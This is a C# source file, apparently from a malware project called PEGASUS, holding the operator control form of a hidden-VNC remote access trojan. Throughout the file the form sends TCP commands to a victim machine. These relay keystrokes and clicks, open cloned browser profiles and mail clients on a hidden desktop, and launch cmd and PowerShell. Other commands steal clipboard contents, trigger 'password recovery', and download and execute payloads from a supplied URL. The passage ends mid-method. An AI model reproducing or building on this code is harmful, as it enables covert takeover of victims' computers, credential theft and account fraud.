using HVNC;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Design.PEGASUS.HVNC
{


    /// <summary>
    /// Defines the <see cref="FrmVNC" />.
    /// </summary>
    public partial class FrmVNC : Form
    {
        /// <summary>
        /// Defines the bool_1.
        /// </summary>
        private bool bool_1;

        /// <summary>
        /// Defines the bool_2.
        /// </summary>
        private bool bool_2;

        /// <summary>
        /// Defines the int_0.
        /// </summary>
        private int int_0;

        /// <summary>
        /// Defines the tcpClient_0.
        /// </summary>
        private TcpClient tcpClient_0;

        /// <summary>
        /// Defines the FrmTransfer0.
        /// </summary>
        public FrmTransfer FrmTransfer0;

        /// <summary>
        /// Gets or sets the xxip.
        /// </summary>
        public string xxip { get; set; }

        /// <summary>
        /// Gets or sets the xhostname.
        /// </summary>
        public string xhostname { get; internal set; }

        /// <summary>
        /// Gets or sets the VNCBoxe.
        /// </summary>
        public PictureBox VNCBoxe { get => this.VNCBox; set => this.VNCBox = value; }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmVNC"/> class.
        /// </summary>
        public FrmVNC()
        {
            this.int_0 = 0;
            this.bool_1 = true;
            this.bool_2 = false;
            this.FrmTransfer0 = new FrmTransfer();
            this.InitializeComponent();
            this.VNCBox.MouseEnter += this.VNCBox_MouseEnter;
            this.VNCBox.MouseLeave += this.VNCBox_MouseLeave;
            this.VNCBox.KeyPress += this.VNCBox_KeyPress;
        }

        /// <summary>
        /// The SendTCP.
        /// </summary>
        /// <param name="object_0">The object_0<see cref="object"/>.</param>
        /// <param name="tcpClient_1">The tcpClient_1<see cref="TcpClient"/>.</param>
        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            try
            {
                lock (tcpClient_1)
                {
                    var binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                    var objectValue = RuntimeHelpers.GetObjectValue(object_0);
                    var memoryStream = new MemoryStream();
                    binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                    var position = checked((ulong)memoryStream.Position);
                    tcpClient_1.GetStream().Write(BitConverter.GetBytes(position), 0, 8);
                    var buffer = memoryStream.GetBuffer();
                    tcpClient_1.GetStream().Write(buffer, 0, checked((int)position));
                    memoryStream.Close();
                    memoryStream.Dispose();
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
            }
        }


        private void VNCBox_MouseEnter(object sender, EventArgs e)
        {
            this.VNCBox.Focus();
        }

        private void VNCBox_MouseLeave(object sender, EventArgs e)
        {
            base.FindForm().ActiveControl = null;
            base.ActiveControl = null;
        }

        private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
        }

        private void VNCBox_MouseDown(object sender, MouseEventArgs e)
        {
            if (this.bool_1)
            {
                this.bool_1 = false;
                this.timer1.Start();
            }
            else if (this.int_0 < SystemInformation.DoubleClickTime)
            {
                this.bool_2 = true;
            }
            Point location = e.Location;
            object tag = this.VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)this.VNCBox.Width / (double)size.Width;
            double num2 = (double)this.VNCBox.Height / (double)size.Height;
            double value = Math.Ceiling((double)location.X / num);
            double value2 = Math.Ceiling((double)location.Y / num2);
            if (this.bool_2)
            {
                if (e.Button == MouseButtons.Left)
                {
                    this.SendTCP("6*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                    return;
                }
            }
            else
            {
                if (e.Button == MouseButtons.Left)
                {
                    this.SendTCP("2*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                    return;
                }
                if (e.Button == MouseButtons.Right)
                {
                    this.SendTCP("3*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                }
            }
        }


        private void VNCBox_MouseUp(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = this.VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)this.VNCBox.Width / (double)size.Width;
            double num2 = (double)this.VNCBox.Height / (double)size.Height;
            double value = Math.Ceiling((double)location.X / num);
            double value2 = Math.Ceiling((double)location.Y / num2);
            if (e.Button == MouseButtons.Left)
            {
                this.SendTCP("4*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
                return;
            }
            if (e.Button == MouseButtons.Right)
            {
                this.SendTCP("5*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
            }
        }


        private void VNCBox_MouseMove(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = this.VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)this.VNCBox.Width / (double)size.Width;
            double num2 = (double)this.VNCBox.Height / (double)size.Height;
            double value = Math.Ceiling((double)location.X / num);
            double value2 = Math.Ceiling((double)location.Y / num2);
            this.SendTCP("8*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
        }

        private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
        {
            this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
        }

        private void VNCBox_MouseHover(object sender, EventArgs e)
        {
            this.VNCBox.Focus();
        }
        /// <summary>
        /// The Check.
        /// </summary>
        public void Check()
        {
            try
            {
                if (FrmTransfer0.FileTransferLabele.Text == null)
                    toolStripStatusLabel3.Text = "Status";
                else
                    toolStripStatusLabel3.Text = FrmTransfer0.FileTransferLabele.Text;
            }
            catch
            {
            }
        }

        /// <summary>
        /// The timer2_Tick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void timer2_Tick(object sender, EventArgs e)
        {
            Check();
        }

        /// <summary>
        /// The timer1_Tick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void timer1_Tick(object sender, EventArgs e)
        {
            checked
            {
                int_0 += 100;
            }

            if (int_0 < SystemInformation.DoubleClickTime)
                return;
            bool_1 = true;
            bool_2 = false;
            int_0 = 0;
        }

        /// <summary>
        /// The FrmV_KeyPress.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="KeyPressEventArgs"/>.</param>
        private void FrmVNC_KeyPress(object sender, KeyPressEventArgs e)
        {
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
        }





        /// <summary>
        /// The QualityScroll_Scroll.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="ScrollEventArgs"/>.</param>
        private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
        {
            QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
            SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
        }

        /// <summary>
        /// The ResizeScroll_Scroll.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="ScrollEventArgs"/>.</param>
        private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
        {

            chkClone1.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
            SendTCP("19*" + Conversions.ToString(ResizeScroll.Value / 100.0), tcpClient_0);
        }

        /// <summary>
        /// The btnBrowsers_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnBrowsers_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The btnSystem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnSystem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The btnApps_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnApps_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The btnDisconnect_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnDisconnect_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show(
                    "Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !",
                    "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
                return;
            SendTCP("24*", tcpClient_0);
            Close();
        }

        /// <summary>
        /// The btnClose_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnClose_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        /// <summary>
        /// The IntervalScroll_Scroll.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="ScrollEventArgs"/>.</param>
        private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
        {
            IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
            SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
        }

        /// <summary>
        /// The CloseBtn_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void CloseBtn_Click(object sender, EventArgs e) => this.SendTCP((object)"16*", this.tcpClient_0);

        /// <summary>
        /// The RestoreMaxBtn_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void RestoreMaxBtn_Click(object sender, EventArgs e)
        {
            SendTCP("15*", tcpClient_0);
        }

        /// <summary>
        /// The MinBtn_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void MinBtn_Click(object sender, EventArgs e)
        {
            SendTCP("14*", tcpClient_0);
        }

        /// <summary>
        /// The test1ToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("11*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("11*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        /// <summary>
        /// Gets or sets the xip.
        /// </summary>
        public string xip { get; internal set; }

        /// <summary>
        /// The test2ToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("12*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("12*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        /// <summary>
        /// The braveToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void braveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("32*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("32*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        /// <summary>
        /// The edgeToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("30*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("30*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        /// <summary>
        /// The operaGXToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void operaGXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("444*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("444*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        /// <summary>
        /// The fileExplorerToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("21*", tcpClient_0);
        }

        /// <summary>
        /// The powershellToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("4876*", tcpClient_0);
        }

        /// <summary>
        /// The cMDToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("4875*", tcpClient_0);
        }

        /// <summary>
        /// The windowsToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("13*", tcpClient_0);
        }

        /// <summary>
        /// The copyToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("3307*", tcpClient_0);
        }

        /// <summary>
        /// The toolStripMenuItem2_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            SendTCP("3306*" + Clipboard.GetText(), (TcpClient)Tag);
        }

        /// <summary>
        /// The StarthVNC_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void StarthVNC_Click(object sender, EventArgs e)
        {
            SendTCP("0*", tcpClient_0);
            FrmTransfer0.FileTransferLabele.Text = "hVNC Started!";
        }

        /// <summary>
        /// The StophVNC_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void StophVNC_Click(object sender, EventArgs e)
        {
            SendTCP("1*", tcpClient_0);
            VNCBox.Image = null;
            FrmTransfer0.FileTransferLabele.Text = "hVNC Stopped!";
            GC.Collect();
        }

        /// <summary>
        /// The thunderbirdToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void thunderbirdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("557*", tcpClient_0);
        }

        /// <summary>
        /// The outlookToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void outlookToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("555*", tcpClient_0);
        }

        /// <summary>
        /// The foxMailToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void foxMailToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("556*", tcpClient_0);
        }

        /// <summary>
        /// The exodosToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void exodosToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("1980*", tcpClient_0);
        }

        /// <summary>
        /// The hhURL.
        /// </summary>
        public void hhURL()
        {
            string url = InputDialog.Show("\nType Your Link Here.\n\n");
            if (string.IsNullOrEmpty(url))
                return;
            SendTCP("8585* " + url, (TcpClient)Tag);
        }

        /// <summary>
        /// The uUpdateClient.
        /// </summary>
        public void uUpdateClient()
        {
            string url = InputDialog.Show("\nType Your Link Here.\n\n");
            if (string.IsNullOrEmpty(url))
                return;
            SendTCP("8589* " + url, (TcpClient)Tag);
        }

        /// <summary>
        /// The hURL.
        /// </summary>
        /// <param name="url">The url<see cref="string"/>.</param>
        public void hURL(string url)
        {
            SendTCP("8585* " + url, (TcpClient)Tag);
        }

        /// <summary>
        /// The UpdateClient.
        /// </summary>
        /// <param name="url">The url<see cref="string"/>.</param>
        public void UpdateClient(string url)
        {
            SendTCP("8589* " + url, (TcpClient)Tag);
        }

        /// <summary>
        /// The ResetScale.
        /// </summary>
        public void ResetScale()
        {
            SendTCP("8587*", (TcpClient)Tag);
        }

        /// <summary>
        /// The KillChrome.
        /// </summary>
        public void KillChrome()
        {
            SendTCP("8586*", (TcpClient)Tag);
        }

        /// <summary>
        /// The PEGASUSRecovery.
        /// </summary>
        public void PEGASUSRecovery()
        {
            SendTCP("3308*", (TcpClient)Tag);
            Thread.Sleep(500);
        }

        /// <summary>
        /// The passwordRecoveryToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("3308*", (TcpClient)Tag);
            Thread.Sleep(500);
        }

        /// <summary>
        /// The updateClientToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void updateClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            uUpdateClient();
        }

        /// <summary>
        /// The downloadExecuteToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void downloadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hhURL();
        }

        /// <summary>
        /// The autoScaleToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void autoScaleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ResetScale();
        }

        /// <summary>
        /// The ReleaseCapture.
        /// </summary>
        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        /// <summary>
        /// The SendMessage.
        /// </summary>
        /// <param name="hwnd">The hwnd<see cref="IntPtr"/>.</param>
        /// <param name="wmsg">The wmsg<see cref="int"/>.</param>
        /// <param name="wparam">The wparam<see cref="int"/>.</param>
        /// <param name="lparam">The lparam<see cref="int"/>.</param>
        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        /// <summary>
        /// The panel1_MouseDown.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="MouseEventArgs"/>.</param>
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }

        /// <summary>
        /// The ENDOFHVNC_Load.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void FrmVNC_Load(object sender, EventArgs e)
        {

            if (FrmTransfer0.IsDisposed)
            {
                FrmTransfer0 = new FrmTransfer();
            }

            FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);

            tcpClient_0 = (TcpClient)base.Tag;

            VNCBox.Tag = new Size(1028, 1028);

            SendTCP("0*", tcpClient_0);
        }

        /// <summary>
        /// The FrmVNC_FormClosing.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="FormClosingEventArgs"/>.</param>
        private void FrmVNC_FormClosing(object sender, FormClosingEventArgs e)
        {
            SendTCP("1*", tcpClient_0);
            VNCBox.Image = null;
            GC.Collect();
            Hide();
            e.Cancel = true;
        }

        /// <summary>
        /// The chkStartStop_CheckedChanged.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void chkStartStop_CheckedChanged(object sender, EventArgs e)
        {
            if (chkStartStop.Checked == true)
            {
                SendTCP("0*", tcpClient_0);
                FrmTransfer0.FileTransferLabele.Text = "hVNC Started!";
            }
            else
            {
                SendTCP("1*", tcpClient_0);
                VNCBox.Image = null;
                FrmTransfer0.FileTransferLabele.Text = "hVNC Stopped!";
                GC.Collect();
            }
        }

        /// <summary>
        /// The FrmVNC_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void FrmVNC_Click(object sender, EventArgs e)
        {
            this.method_18((object)null);
        }

        /// <summary>
        /// The method_18.
        /// </summary>
        /// <param name="object_0">The object_0<see cref="object"/>.</param>
        internal void method_18(object object_0)
        {
            base.ActiveControl = (Control)object_0;
        }

        private void btnCocCoc_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("995*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("995*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnSlimjet_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("1001*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("1001*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnAtomBrowser_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("992*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("992*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnWaterfox_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("1005*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("1005*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnAwast_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("993*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("993*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnChromodo_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("994*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("994*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnComodoDragon_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("996*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("996*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnEpic_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("997*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("997*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnOperaNeon_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("998*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("998*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnPalemoon_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("1000*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("1000*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnSputnik_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("1002*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("1002*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btn360_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("991*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("991*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnUC_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("1003*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("1003*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnOrbitum_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("999*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("999*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnVivaldi_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
                SendTCP("1004*" + Conversions.ToString(true), (TcpClient)Tag);
            }
            else
            {
                SendTCP("1004*" + Conversions.ToString(false), (TcpClient)Tag);
            }
        }

        private void btnYandex_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked)
            {
                if (FrmTransfer0.IsDisposed)
                    FrmTransfer0 = new FrmTransfer();
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(Tag);
                FrmTransfer0.Hide();
